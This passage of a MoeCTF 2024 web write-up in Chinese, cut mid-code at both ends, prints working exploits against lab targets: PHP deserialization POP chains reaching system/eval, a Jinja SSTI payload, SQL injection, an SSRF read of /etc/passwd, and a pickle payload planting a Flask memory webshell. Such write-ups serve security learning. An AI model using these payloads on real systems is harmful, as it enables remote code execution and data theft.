</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $evil<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;cat /flag&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $a;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>B</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $b<span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;system&#39;</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>A</span>();
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>B</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$serialized_data <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($exp);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;?data=&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>urlencode</span>($serialized_data) ;
</span></span></code></pre></div><p>这里微调一下代码，<code>$a</code>前面的private需要改成public，要不然调用不了<code>$a</code>.</p><h2 id=垫刀之路07-泄漏的密码>垫刀之路07: 泄漏的密码</h2><p>考察的Flask，得到pin进入console里面</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span>os<span style=color:#f92672>.</span>listdir()
</span></span><span style=display:flex><span>[<span style=color:#e6db74>&#39;__pycache__&#39;</span>, <span style=color:#e6db74>&#39;flag&#39;</span>, <span style=color:#e6db74>&#39;app.py&#39;</span>, <span style=color:#e6db74>&#39;getPIN.py&#39;</span>, <span style=color:#e6db74>&#39;static&#39;</span>, <span style=color:#e6db74>&#39;templates&#39;</span>]
</span></span><span style=display:flex><span><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;flag&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f: print(f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>strip())
</span></span><span style=display:flex><span>moectf{DONT_usIng<span style=color:#f92672>-</span>fLasK_6y_DE6UG_MOd_aNd<span style=color:#f92672>-</span>le4k<span style=color:#f92672>-</span>YOuR_p1nb}
</span></span></code></pre></div><h2 id=静态网页>静态网页</h2><p>这题需要抓包看回显，orz我之前一直在看前端</p><p>看/api/get/?id=1-53可以得到具体的php</p><p>进去是一个MD5绕过</p><p>原来想着自绕过的，但是没有办法</p><p>后来直接a=0a，b[0a]=md5(0a)即可绕过，思路没转过来</p><h2 id=whos-blog>who&rsquo;s blog?</h2><p>fenjing一把梭得到答案</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?id<span style=color:#f92672>={{</span>cycler.next.__globals__.__builtins__.__import__<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)</span>.popen<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;env&#39;</span><span style=color:#f92672>)</span>.read<span style=color:#f92672>()}}</span>;
</span></span></code></pre></div><h2 id=proveyourlove>ProveYourLove</h2><p>方法1：抓包，发包得到flag</p><p><img alt=love1 loading=lazy src=/posts/ctf/moectf2024/love1.png></p><p><img alt=love2 loading=lazy src=/posts/ctf/moectf2024/love2.png></p><p>方法2：不会第一种可以手动删cookie，慢慢按</p><p>方法3：我做的时候没想到发包，在对应前端检测的地方打断点控制台绕过了，不推荐</p><h2 id=弗拉格之地的挑战>弗拉格之地的挑战</h2><p>第0层：直接进/flag1ab.html</p><p>第一层：看源码得到提示和下一层</p><pre tabindex=0><code>&lt;!--flag1: bW9lY3Rm--&gt;
&lt;!--下一步：/flag2hh.php--&gt;
</code></pre><p>第二层：如图所示</p><p><img alt=挑战 loading=lazy src=/posts/ctf/moectf2024/%E6%8C%91%E6%88%98.png></p><table><thead><tr><th>flag2</th><th>e0FmdEV</th></tr></thead><tbody><tr><td>nextpage</td><td>/flag3cad.php</td></tr></tbody></table><p>第三层:</p><pre tabindex=0><code>?a=a
b=a
cookie:verify=admin
</code></pre><p><code>flag3: yX3RoMXN</code></p><p><code>/flag4bbc.php</code></p><p>第四层：</p><p>控制台手动触发打断点</p><pre tabindex=0><code>var event = new MouseEvent(&#39;click&#39;, {
    &#39;view&#39;: window,
    &#39;bubbles&#39;: true,
    &#39;cancelable&#39;: true
});

var button = document.getElementById(&#34;scope&#34;).getElementsByTagName(&#34;button&#34;)[0];
button.id = 9; // 首先将其ID设置为9
button.dispatchEvent(event); // 手动触发点击事件
</code></pre><pre tabindex=0><code>flag4: fdFVUMHJ
前往：/flag5sxr.php
</code></pre><p>第五层：</p><p>提示框输入相应的内容，控制台输入content=&lsquo;aaa&rsquo;，对应内容打断点</p><p>flag5: fSV90aDF</p><p>第六层：?moe=FLAG</p><p>post:moe=1</p><p>flag6: rZV9VX2t</p><p>第七层：</p><p>what=system(&lsquo;cat /f*&rsquo;);</p><p>得到flag：rbm93X1dlQn0=</p><p>最后七层的flag拼接base64得到答案</p><p>bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=</p><p><strong>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</strong></p><h2 id=moe-pop>moe pop</h2><p>先上源码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>class000</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $payl0ad <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> $what;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__destruct</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>check</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>payl0ad</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;FAILED TO ATTACK&#39;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $a <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>what</span>;
</span></span><span style=display:flex><span>        $a();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>class001</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $payl0ad;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $a;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__invoke</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>payload</span> <span style=color:#f92672>=</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>payl0ad</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>class002</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $sec;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__set</span>($a, $b)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span>$b($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sec</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dangerous</span>($whaattt)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        $whaattt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>evvval</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sec</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>class003</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $mystr;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>evvval</span>($str)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>eval</span>($str);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>__tostring</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>mystr</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;data&#39;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $a <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($_GET[<span style=color:#e6db74>&#39;data&#39;</span>]);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>进行简单的代码审计，从后往前推</p><p>class003有eval函数可以进行利用,class002中调用dangerous函数可以利用拼接，想引用dangerous可以给class001的payl0ad进行赋值利用a来new一个class002,要使用invoke函数的话，可以看class000,首先令payl0ad=000,成功正常的，成功给what赋值new class001</p><p>大题的思路就是这样正推的话直接上payload，为了连接起来，部分内容需要修改成public</p><p>exp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>class000</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>what</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>class001</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>what</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>payl0ad</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;dangerous&#39;</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>what</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>class002</span>;
</span></span><span style=display:flex><span>$exp1<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>class003</span>;
</span></span><span style=display:flex><span>$exp1<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>mystr</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#39;phpinfo();&#39;</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>what</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>a</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sec</span> <span style=color:#f92672>=</span> $exp1;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($exp));
</span></span></code></pre></div><p>payl0ad和sec我都改成public了，最后可以在phpinfo里面找到flag,ctrl+f搜索moe</p><h2 id=勇闯铜人阵>勇闯铜人阵</h2><p>😋之前自己敲完一个代码之后就了解了一些基础了，晚上敲一会出来了，自己代码能力还是要练一下的,关键点可能就是session保持持续会话，我第一次尝试的时候没用到session，第二次是代码逻辑问题</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://127.0.0.1:59353/&#39;</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span>post_data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;player&#39;</span>: <span style=color:#e6db74>&#34;123&#34;</span>, <span style=color:#e6db74>&#39;direct&#39;</span>: <span style=color:#e6db74>&#34;弟子明白&#34;</span>}
</span></span><span style=display:flex><span>post_response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>post_data)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_direction</span>(number):
</span></span><span style=display:flex><span>    directions <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>1</span>: <span style=color:#e6db74>&#34;北方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>2</span>: <span style=color:#e6db74>&#34;东北方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>3</span>: <span style=color:#e6db74>&#34;东方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>4</span>: <span style=color:#e6db74>&#34;东南方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>5</span>: <span style=color:#e6db74>&#34;南方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>6</span>: <span style=color:#e6db74>&#34;西南方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>7</span>: <span style=color:#e6db74>&#34;西方&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>8</span>: <span style=color:#e6db74>&#34;西北方&#34;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> directions<span style=color:#f92672>.</span>get(number, <span style=color:#e6db74>&#34;无效的方向&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>extract</span>(html_content):
</span></span><span style=display:flex><span>    tag <span style=color:#f92672>=</span> BeautifulSoup(html_content, <span style=color:#e6db74>&#39;html.parser&#39;</span>)<span style=color:#f92672>.</span>find(<span style=color:#e6db74>&#39;h1&#39;</span>, id<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;status&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> tag<span style=color:#f92672>.</span>text <span style=color:#66d9ef>if</span> tag <span style=color:#66d9ef>else</span> <span style=color:#e6db74>&#34;状态未找到&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>extract_numbers</span>(text):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> [int(num) <span style=color:#66d9ef>for</span> num <span style=color:#f92672>in</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;\d+&#39;</span>, text)]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 提取状态文本</span>
</span></span><span style=display:flex><span>    status_text <span style=color:#f92672>=</span> extract(post_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;状态: </span><span style=color:#e6db74>{</span>status_text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    numbers <span style=color:#f92672>=</span> extract_numbers(status_text)
</span></span><span style=display:flex><span>    count <span style=color:#f92672>=</span> len(numbers)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> count <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>get_direction(numbers[<span style=color:#ae81ff>0</span>])<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;，&#34;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>get_direction(num)<span style=color:#e6db74>}</span><span style=color:#e6db74>一个&#34;</span> <span style=color:#66d9ef>for</span> num <span style=color:#f92672>in</span> numbers])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;方向: </span><span style=color:#e6db74>{</span>ans<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;player&#39;</span>: <span style=color:#e6db74>&#34;123&#34;</span>, <span style=color:#e6db74>&#39;direct&#39;</span>: ans}
</span></span><span style=display:flex><span>    post_response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    status_text <span style=color:#f92672>=</span> extract(post_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;新的状态: </span><span style=color:#e6db74>{</span>status_text<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h2 id=电院_backend>电院_Backend</h2><p>过了一阵子才写，其实就是简单的sql注入，只是不怎么遇到sql的题目，所以也就不怎么会写了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-mysql data-lang=mysql><span style=display:flex><span>test<span style=color:#f92672>@</span>example.com<span style=color:#e6db74>&#39; UNION SELECT null, null, null -- 
</span></span></span></code></pre></div><p>进行绕过得到flag</p><h2 id=imagecloud前置>ImageCloud前置</h2><p>其实应该算在ssrf里面吧，利用<code>?url=file:///etc/passwd</code>,读取到flag</p><h2 id=imagecloud>ImageCloud</h2><p>一开始尝试了图片一句话和vps外带执行命令，完全就是逻辑方向错了。</p><p>根据hint的提示给的是损坏的，但是容器是好的，再细看app2.py的代码（我一开始就没看</p><p>可以得出其实容器开了两个端口？利用**<code>?url=http://127.0.0.1:xxxx/image/flag.jpg</code>**，然后结合bp快速扫一下5001-6000的端口</p><p>就找到flag.jpg所在位置，图片上有flag</p><p><img alt=cloud loading=lazy src=/posts/ctf/moectf2024/cloud.png></p><h2 id=petstore复现>PetStore(复现)</h2><p>是个pickle的题目，写的时候没有往内存马那边想后来请教学长告诉了可以直接打个🐎进去，因为种种原因直到结束都没再写，复现一下。以下是一开始的个人思路。</p><p>关键的代码定位是import_pet部分的代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>import_pet</span>(self, serialized_pet) <span style=color:#f92672>-&gt;</span> bool:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            pet_data <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64decode(serialized_pet)
</span></span><span style=display:flex><span>            pet <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>loads(pet_data)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> isinstance(pet, Pet):
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> self<span style=color:#f92672>.</span>pets:
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> i<span style=color:#f92672>.</span>uuid <span style=color:#f92672>==</span> pet<span style=color:#f92672>.</span>uuid:
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>pets<span style=color:#f92672>.</span>append(pet)
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>export_pet</span>(self, pet_uuid) <span style=color:#f92672>-&gt;</span> str <span style=color:#f92672>|</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        pet <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>get_pet(pet_uuid)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> pet <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>pets<span style=color:#f92672>.</span>remove(pet)
</span></span><span style=display:flex><span>            serialized_pet <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(pickle<span style=color:#f92672>.</span>dumps(pet))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;utf-8&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> serialized_pet
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span></code></pre></div><p>要反序列化读取env得到flag，dockerfile是写在env里的，容器不出网，题目容器侧无法主动发起与外部网络的连接。</p><p>测试了正常的通过uuid收养一个新宠物正常通过然后改成<code>__reduce__</code>想读取env，但是读取不通</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> uuid
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Pet</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self, name, species, uuid):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>name <span style=color:#f92672>=</span> name
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>species <span style=color:#f92672>=</span> species
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>uuid <span style=color:#f92672>=</span> uuid
</span></span><span style=display:flex><span>	<span style=color:#75715e>#def __repr__(self):</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>#   return f&#34;Pet(name={self.name}, species={self.species}, uuid={self.uuid})&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (os<span style=color:#f92672>.</span>system, (<span style=color:#e6db74>&#34;env&#34;</span>,))
</span></span><span style=display:flex><span>    	<span style=color:#75715e>#return eval,(&#34;__import__(&#39;os&#39;).system(&#39;env&#39;)&#34;,)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>uuid <span style=color:#f92672>=</span> str(uuid<span style=color:#f92672>.</span>uuid4())
</span></span><span style=display:flex><span>print(uuid)
</span></span><span style=display:flex><span>a<span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(pet)
</span></span><span style=display:flex><span>print(a)
</span></span><span style=display:flex><span>encoded_pet <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(a)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Encoded Payload: </span><span style=color:#e6db74>{</span>encoded_pet<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><p>(ps:想想其实有什么空白文件把内容打印到上面也行的，还是老老实实打个内存马吧)然后是正常的推进思路打个内存马进去</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Pet</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        cmd_injection <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;__import__(&#39;os&#39;).popen(request.args.get(&#39;cmd&#39;)).read()&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> eval, (<span style=color:#e6db74>&#34;__import__(&#39;sys&#39;).modules[&#39;__main__&#39;].__dict__[&#39;app&#39;]&#34;</span>
</span></span><span style=display:flex><span>                      <span style=color:#e6db74>&#34;.before_request_funcs.setdefault(None, []).append(lambda :&#34;</span> <span style=color:#f92672>+</span> cmd_injection <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;)&#34;</span>,)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 创建类实例并序列化为pickle，再进行base64编码</span>
</span></span><span style=display:flex><span>a <span style=color:#f92672>=</span> Pet()
</span></span><span style=display:flex><span>b <span style=color:#f92672>=</span> pickle<span style=color:#f92672>.</span>dumps(a)
</span></span><span style=display:flex><span>print(base64<span style=color:#f92672>.</span>b64encode(b)<span style=color:#f92672>.</span>decode())
</span></span></code></pre></div><p>然后执行<code>?cmd=env</code>可以读取flag</p><h2 id=re-从零开始的-xdu-教书生活复现>Re: 从零开始的 XDU 教书生活(复现)</h2><p>困惑点在我怎么得到所有学生的学号以及密码登陆，因为是python写还需要分析加密逻辑，以及由于是动态的二维码图片，我想的是一个程序跑登陆学生，一个程序教师端登陆不断的发包请求识别下载二维码以保证图片的，可能确实是思路发散的太多了</p><p>代码思路是首先，使用老师的账号登录并获取二维码，然后退出登录。用每个学生的账号进行登录，使用事先获取的签到 URL 来完成签到。xxx需要自己填对应内容</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;xxx&#39;</span>
</span></span><span style=display:flex><span>teacher_phone <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10000&#39;</span>
